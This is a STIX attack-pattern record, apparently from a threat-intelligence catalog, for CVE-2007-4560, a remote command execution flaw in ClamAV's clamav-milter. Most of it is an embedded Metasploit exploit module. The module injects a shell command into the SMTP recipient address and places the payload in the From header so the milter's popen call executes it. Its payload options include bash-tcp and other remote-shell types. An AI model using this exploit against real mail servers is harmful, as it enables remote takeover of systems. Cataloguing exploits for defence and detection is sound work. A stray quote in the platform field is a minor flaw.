{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--342130a1-8774-40c9-91a9-f9346bd33d81",
    "created": "2024-08-14T17:14:10.027805Z",
    "modified": "2024-08-14T17:14:10.027809Z",
    "name": "ClamAV Milter Blackhole-Mode Remote Code Execution",
    "description": " This module exploits a flaw in the Clam AntiVirus suite 'clamav-milter' (Sendmail mail filter). Versions prior to v0.92.2 are vulnerable. When implemented with black hole mode enabled, it is possible to execute commands remotely due to an insecure popen call. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/smtp/clamav_milter_blackhole.rb",
            "external_id": "clamav_milter_blackhole.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4560"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Smtp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ClamAV Milter Blackhole-Mode Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a flaw in the Clam AntiVirus suite 'clamav-milter'\n        (Sendmail mail filter). Versions prior to v0.92.2 are vulnerable.\n        When implemented with black hole mode enabled, it is possible to execute\n        commands remotely due to an insecure popen call.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-4560' ],\n          [ 'OSVDB', '36909' ],\n          [ 'BID', '25439' ],\n          [ 'EDB', '4761' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby bash-tcp telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2007-08-24',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'nobody@localhost']),\n      ])\n  end\n\n  def exploit\n\n    # ClamAV writes randomized msg.###### temporary files in a randomized\n    # /tmp/clamav-#######################/ directory. This directory is\n    # the clamav-milter process working directory.\n    #\n    # We *can* execute arbitrary code directly from 'sploit', however the\n    # SMTP RFC rejects all payloads with the exception of generic CMD\n    # payloads due to the IO redirects. I discovered that the 'From:'\n    # header is written to this temporary file prior to the vulnerable\n    # call, so we call the file itself and payload.encoded is executed.\n\n    sploit = \"sh msg*\" # Execute the clamav-milter temporary file.\n\n    # Create the malicious RCPT TO before connecting,\n    # to make good use of the Msf::Exploit::Smtp support.\n\n    oldaddr = datastore['MAILTO']\n    newaddr = oldaddr.split('@')\n\n    datastore['MAILTO'] = \"<#{newaddr[0]}+\\\"|#{sploit}\\\"@#{newaddr[1]}>\"\n\n    connect_login\n\n    sock.put(\"From: ;#{payload.encoded}\\r\\n\") # We are able to stick our payload in this header\n    sock.put(\".\\r\\n\")\n\n    # Clean up RCPT TO afterwards\n\n    datastore['MAILTO'] = oldaddr\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-08-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}